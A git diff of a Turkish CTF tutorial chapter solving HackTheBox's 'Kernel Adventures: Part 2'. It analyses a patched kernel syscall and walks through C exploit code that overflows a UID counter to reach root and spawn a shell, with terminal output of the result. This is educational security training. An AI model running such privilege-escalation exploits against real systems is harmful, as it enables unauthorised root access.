@@ -1,14 +1,18 @@
 # Hedefimiz
-İlk pratiğimiz olarak HackTheBox platformundaki [Kernel Adventures: Part 2](https://app.hackthebox.com/challenges/Kernel%2520Adventures%253A%2520Part%25202)'yi
-tamamlayacağız. Neden Part 1'den başlamadığımı merak ederseniz, maalesef bu bölüm sadece VIP kullanıcıları tarafından erilebilir.
+Bu bölümde bir CTF challenge'ı çözüyor olacağız:
 
-Ama merak etmeyin bu challenge giriş düzeyi için tam olarak aradığımız şey. Amacımız oldukça basit, bize verilen makinede root almak.
+- **İsim**: Kernel Adventures: Part 2
+- **Kaynak**: [HackTheBox](https://app.hackthebox.com/challenges/Kernel%2520Adventures%253A%2520Part%25202)
+- **Link**: [challenge.tar.gz](../src/kernel_adventrues_2/challenge.tar.gz)
+
+Bu challenge giriş düzeyi için tam olarak aradığımız şey. Amacımız oldukça basit, bize verilen makinede root almak.
 
 # Kaynak Analizi
 Bize verilen dosyalara bakalım:
 - `bzImage`: Bu inşa edilmiş Linux kernel'i. Derleme sırasında oluşturulan `vmlinux`, statik ELF binary'si, `vmlinuz` bu binary'nin sıkıştırılmış
 versiyonu, ve `bzImage` bu binary'nin boot edilebilir bir versiyonu.
-- `dist.cpio.gz`: Bu sıkıştırılmış, initramdisk/initramfs dosya sistemi.
+- `.config`: Kernel'i derlemek için kullanılan konfigürasyon dosyası, `make defconfig` ya da `make x86_64_defconfig` ile oluşturulan config dosyaları gibi.
+- `dist.cpio.gz`: Bu sıkıştırılmış, initramdisk dosya sistemi.
 - `run.sh`: CTF'i yapan kişinin kolaylık olması açısından eklediği bir QEMU başlangıç script'i.
 - `README.md`: Yine CTF'i yapan kişinin kolaylık olması adına eklediği kernel'i patchleyip derleme komutlarını içeren bir README dosyası.
 
@@ -24,7 +28,6 @@ olan patch. Bakalım bu patch ile neler eklenmiş:
 ```
 İlk olarak kerneli derlemek için kullanılan, inşa komutlarını içeren `Makefile` dosyasına yeni bir dizin eklenmiş. Yani yeni bir kayank dizini
 oluşturulmuş demek.
-
 ```diff
 diff --git a/arch/x86/entry/syscalls/syscall_64.tbl b/arch/x86/entry/syscalls/syscall_64.tbl
 index 18b5500ea..580dc1892 100644
@@ -37,7 +40,6 @@ index 18b5500ea..580dc1892 100644
 +449    common  magic               sys_magic
 ```
 64 bit sistem çağrıları tablosuna yeni bir sistem çağrısı eklenmiş: `sys_magic`.
-
 ```diff
 @@ -880,8 +880,11 @@ __SYSCALL(__NR_memfd_secret, sys_memfd_secret)
  #define __NR_process_mrelease 448
@@ -50,32 +52,8 @@ index 18b5500ea..580dc1892 100644
 -#define __NR_syscalls 449
 +#define __NR_syscalls 450
 ```
-Bu yeni sistem çağrısının numarası `449`, güzel. Patch'in geri kalanında bu yeni "magic" sistem çağrısının implementasyonu mevcut, ancak
-buraya geçmeden önce sistem çağrılarını anlasak iyi ederiz.
-
-### Sistem çağrıları
-Kernel'den userland'e geçmenin birçok yolu var, ancak userland'den kernel'e geçmenin pek bir yolu yok. Yine de bunu yapmak zorundayız çünkü
-kernel bize bir şekilde, gerekli yerlerde, kernel'in bize sunduğu özellikleri kullanabilmemiz için bir arayüz sağlamalı. Bu arayüz sistem
-çağrıları aracılığı ile sağlanıyor.
-
-Sistem çağrıları basitçe kernel'e geçiş yapıp, "hey bizim için şunu yapar mısın?" dediğimiz nokta. Bunu yapmanın farklı yolları var, eskiden
-özellikle 32 bit sistemlerde yaygın olan yöntem, özel bir yazılım interrupt'ı çğaırmaktan geçiyordu. Kernel bu interrupt'ın sistem çağrısı interrupt'u
-olduğunu bildiğinden, interrupt'ı sistem çağrılarına ait fonksiyonları kullanmak için kullanıyordu. Klasik UNIX'de, ve Linux'da kullanılan bu interrupt
-sayısı 128 (`0x80`) idi.
-
-Ancak 64 bit sistemlerde Intel Pentium II ile beraber yeni bir yöntem geliştirdi. Sistem çağrıları için ayrı bir instruction oluşturdu. Bu instruction'lar
-kullanım için kernel tarafından doğru ayarlanırsa, userland'de `SYSENTER`, ve kernel'de `SYSEXIT` instruction'ı kullanarak iki mod arasında hızlıca geçiş
-yapmak mümkün oldu.
-
-AMD ise kendi instructionlarını, `SYSCALL` ve `SYSRET`i yayınladı. Bu instruction set'lerinden,
-[64 bit de her iki işlemcide de çalışanlar](https://wiki.osdev.org/SYSENTER#Compatibility_across_Intel_and_AMD) AMD'nin `SYSCALL` ile `SYSRET` çifti.
-Tabi kernel'in bu instructionar'ların kullanımı için gerkeli hazırlıkları yaptığını varsayarsak.
-
-Linux kernel'i de bu instruction'ları destekliyor. Ve biz şuan 64 bit bir kernel ile uğraştığımızdan tüm sistem çağrıları bu instructionlar aracılığı
-ile çalışıyor.
-
-Kernel hangi sistem çağrısını çağrıldığını anlamak için `rax` register'ını kullanıyor. Ve sistem çağrılarının argümanları için klasik C'nin calling convetion'ını
-(`rdi`, `rsi`, `rdx`, `rcx`, ...) kullanılıyor. Bu durumda yeni eklenen `magic` sistem çağrsının numarası 449, ve 3 argüman kabul edecek şekilde tanımlanıyor:
+Bu yeni sistem çağrısının numarası `449`, güzel. Patch'in geri kalanında bu yeni `magic()` sistem çağrısının implementasyonu mevcut.
+Ve gördüğünüz gibi 3 argüman kabul edecek şekilde tanımlanıyor:
 ```diff
 +SYSCALL_DEFINE3(magic, MagicMode, mode, unsigned char __user*, username, unsigned char __user*, password) {
 +    char username_buf[64];
@@ -235,30 +213,24 @@ Fakat bir sürekli olarak `children` listesine yeni bir kullanıcı ekleyip `do_
 kullanıcı ekleyebiliriz.
 
 # Exploit
-Bu standart olmayan magic sistem çağrısı için bir glibc foksiyonu mevcut değil tabiki de, o yüzden `syscall()` makrosu ile kendi `magic()`
-userland çağrımızı oluşturabiliriz:
+Tam exploit'in kaynak koduna [burdan ulaşabilirsiniz](../src/kernel_adventures_2/exploit.c). Ben şimdi exploit'i parça parça açıklayacapım.
+
+İlk olarak `magic()`i çağırmanın bir yolu lazım. Bu standart olmayan magic sistem çağrısı için bir GNU C kütüphanesi foksiyonu mevcut değil
+tabiki de, o yüzden `syscall()` makrosu ile kendi `magic()` userland çağrımızı oluşturabiliriz:
 ```c
-#include <stdint.h>
-#include <string.h>
-
-#include <fcntl.h>
-#include <stdio.h>
-
-typedef enum {
-  MAGIC_ADD = 0,
-  MAGIC_EDIT = 1,
-  MAGIC_DELETE = 2,
-  MAGIC_SWITCH = 3,
-} MagicMode;
-
-
 int64_t magic(MagicMode mode, char *username, char *password){
   return syscall(449, mode, username, password);
 }
-
-int main(){
-  int64_t ret = 0;
-
+```
+Kaynak kodundan hatırlarsanız, `do_add` yeni eklenen kullanıcının UID'sini döndürüyor:
+```diff
++    ret = (long)nextId;
++    nextId++;
++    return ret;
++}
+```
+Bunu bildiğimizden exploit'imizde bir `while` döngüsü ile UID'yi sınıra getirene kadar artırabiliriz, sınıra geldiğimizde sıradaki kullanıcımızın UID'si 0 olacaktır:
+```c
   while((ret = magic(MAGIC_ADD, "fill", "fill")) < UINT16_MAX){
     if(ret < 0){
       printf("failed to add the fill user: %s\n", strerror(-ret));
@@ -270,7 +242,10 @@ int main(){
       return EXIT_FAILURE;
     }
   }
-
+```
+UID'si 0 olan bu kullanıcıyı ekledikten sonra, bize ait, `children` listesinin üyesi bir kullanıcı olduğundan, `do_switch` ile doğrudan parola belirtmeden bu kullanıcıya
+geçiş yapabiliriz:
+```c
   if((ret = magic(MAGIC_ADD, "notroot", "notroot")) < 0){
     printf("failed to add the notroot user: %s\n", strerror(-ret));
     return EXIT_FAILURE;
@@ -280,7 +255,10 @@ int main(){
     printf("failed to switch to the notroot user: %s\n", strerror(-ret));
     return EXIT_FAILURE;
   }
-
+```
+Bu geçişin ardından, herşey doğru giderse, `commit_creds()` ile cred'lerimiz güncellenmiş olacaktır. Ve `getuid()` ile UID'imizi kontrol ettiğimizde root olmamız
+gerekir. Bunu kontrol ettikten sonra, exploitimiz bir shell çalıştırıp kontrolü bize veriyor:
+```c
   if(getuid() != 0){
     puts("exploit failed :(");
     return EXIT_FAILURE;
@@ -289,25 +267,7 @@ int main(){
   puts("exploit was successful, popping a shell");
   char *args[] = {"/bin/sh", NULL};
   execve("/bin/sh", args, NULL);
-
-  perror("execve failed");
-  return EXIT_FAILURE;
-}
 ```
-Kaynak kodundan hatırlarsanız, `do_add` yeni eklenen kullanıcının UID'sini döndürüyor:
-```diff
-+    ret = (long)nextId;
-+    nextId++;
-+    return ret;
-+}
-```
-Bunu bildiğimizden exploit'imizdeki `while` döngüsü ile UID'yi sınıra getirene kadar artırabiliriz, sınıra geldiğimizde sıradaki kullanıcımızın UID'si 0 olacaktır.
-UID'si 0 olan bu kullanıcıyı ekledikten sonra, bize ait, `children` listesinin üyesi bir kullanıcı olduğundan, `do_switch` ile doğrudan parola belirtmeden bu kullanıcıya
-geçiş yapabiliriz.
-
-Bu geçişin ardından, herşey doğru giderse, `commit_creds()` ile cred'lerimiz güncellenmiş olacaktır. Ve `getuid()` ile UID'imizi kontrol ettiğimizde root olmamız
-gerekir. Bunu kontrol ettikten sonra, exploitimiz bir shell çalıştırıp kontrolü bize veriyor.
-
 Bu exploit'i, `exploit.c` olarak kaydedikten sonra, bize verilen QEMU ortamında denemek için `run.sh` scriptini güncelledim:
 ```bash
 #!/bin/sh -e
@@ -324,10 +284,12 @@ qemu-system-x86_64 \
     -monitor /dev/null \
         -nographic -append "console=ttyS0"
 ```
-Basitçe initramdisk'e exploit'imizi derleyip ekliyoruz. Derlemek için hem her makinede çalışacak çıktı üretebildiğinden ([cross-compiler](https://en.wikipedia.org/wiki/Cross_compiler)), hem de
-daha küçük binary'ler ürretiğinden GCC derleyicisi yerine musl-gcc'yi kullanıyoruz (debian tabanlı dağıtımlarda, `musl-tools` paketini kurarak kurabilirsiniz).
+Basitçe initramdisk'e exploit'imizi derleyip ekliyoruz. Derlemek için hem her makinede çalışacak çıktı üretebildiğinden ([cross-compiler](https://en.wikipedia.org/wiki/Cross_compiler)),
+hem de daha küçük binary'ler ürretiğinden GCC derleyicisi yerine musl-gcc'yi kullanıyoruz (debian tabanlı dağıtımlarda, `musl-tools` paketini kurarak kurabilirsiniz).
 
-Hadi exploit'i deneyelim:
+Exploit'i sadece kendi makineizde çalıştıracaksanız, yani HackTheBox'ın verdiği makinede çalıştırmayacaksanız, elbet klasik GCC derleyicisini de kullanabilirsiniz.
+
+Her neyse, hadi makineyi başlatıp exploit'i deneyelim:
 ```
 / $ id
 uid=1 gid=1
@@ -339,4 +301,4 @@ uid=0 gid=0
 Ve ilk root expolitimiz bundan ibaret! Dilerseniz bunu HackTheBox makinesinde çalıştırıp, bayrağı da alabilirsiniz.
 
 ---
-[Önceki](intro.md) | [Sonraki](end.md)
+[Önceki](intro.md) | [Sonraki](babydriver_no_smep.md)
